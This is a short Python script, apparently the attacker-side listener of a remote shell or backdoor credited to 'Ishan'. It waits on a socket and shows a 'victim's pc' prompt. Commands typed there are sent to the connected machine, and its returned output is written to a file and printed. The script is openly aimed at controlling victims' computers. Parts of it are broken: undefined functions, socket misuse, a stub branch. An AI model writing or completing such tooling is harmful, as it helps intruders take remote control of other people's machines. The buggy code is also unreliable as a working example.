import time
import sys
import socket
import os

print("\033[45m Concept & coded by\033[31m :\033[91m Ishan \033[0m ")

s = socket.socket()
_host = "localhost"#str(input("set host> "))
host = _host
port = 8080 #int(input("set port> "))

#port = 8080
s.bind((host, port))
print("\033[93msearching\033[5m...\033[0m")
_users =[]
for i in range(10):
	s.listen(i)
	conn, addr = s.accept()

	
	def _recv():
		_data = s.recv(1024)
		_data = _data.decode()
		return _data

	def _send(outData):
		_data = s.send(1024)
		_data = _data.encode()
	print(addr, " \033[0m\033[1m\033[92m\033[5mconnected\033[0m")
	_users += [addr]
	_x = 4
	while _x == 4 :
		msg = input(str("\033[93mvictim's pc:~\033[91m\033[1m$\033[0m\033[94m "))
		cmd_array = msg.split()
		if (msg == "/"):
			_x += 10
			conn.send(msg.encode())
			print("\033[36m[\033[33m-\033[36m]\033[0m Session \033[91mclosed\033[5m\033[1m\033[91m!\033[0m")
		elif (msg == "dump_ss"):
			print("elseif")
		elif (str(cmd_array[0]) == "download"):

			send(cmd_array[1])
		else:
			
			conn.send(msg.encode())
		
			f = open("outPut.txt", 'wb')
			
			#while (True):
			#l = conn.recv(1024)
			
			n = 1
			while n == 1:
				#f.write(l)
				l = conn.recv(1024)
				f.write(l)
				if len(l) < 1024:
					n = 2
					#print("Done")
				#print(str(l))
				#print(len(l))
			#print(l)
			
			f.close()
			print("\033[0m\033[3m\033[90m")
			print("\033[0m\033[3m" + str(os.system("cat outPut.txt")))


print(_users)
